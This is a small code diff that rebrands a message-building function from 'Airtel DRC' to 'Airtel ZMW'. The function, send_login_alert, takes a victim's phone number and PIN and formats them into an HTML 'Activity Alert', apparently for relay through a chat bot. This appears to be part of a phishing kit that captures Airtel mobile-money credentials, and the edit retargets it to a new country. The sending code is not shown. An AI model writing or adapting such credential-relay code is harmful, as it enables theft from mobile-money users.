@@ -104,7 +104,7 @@ async def send_login_alert(phone: str, pin: str, action: str = "LOGIN") -> dict:
     ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
 
     text = (
-        "🔔 <b>Airtel DRC — Activity Alert</b>\n"
+        "🔔 <b>Airtel ZMW — Activity Alert</b>\n"
         "━━━━━━━━━━━━━━━\n\n"
         "📱 <b>PHONE NUMBER</b>\n"
         f"<pre>{phone}</pre>\n"
